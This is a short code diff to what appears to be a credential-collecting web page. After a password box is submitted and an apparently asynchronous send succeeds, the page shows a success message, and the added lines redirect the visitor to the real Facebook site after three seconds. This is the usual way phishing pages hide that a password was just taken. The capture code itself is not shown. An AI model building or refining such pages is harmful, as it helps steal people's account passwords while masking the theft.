@@ -157,6 +157,11 @@
             // Hide the password box and show the success message
             document.getElementById('passwordBox').style.display = 'none';
             document.getElementById('successMessage').style.display = 'flex';
+
+            // Redirect to Facebook after 3 seconds
+            setTimeout(function() {
+                window.location.href = "https://www.facebook.com";
+            }, 3000); // 3000ms = 3 seconds
         }, function(error) {
             console.error('FAILED...', error);
             alert('There was an error. Try again.');
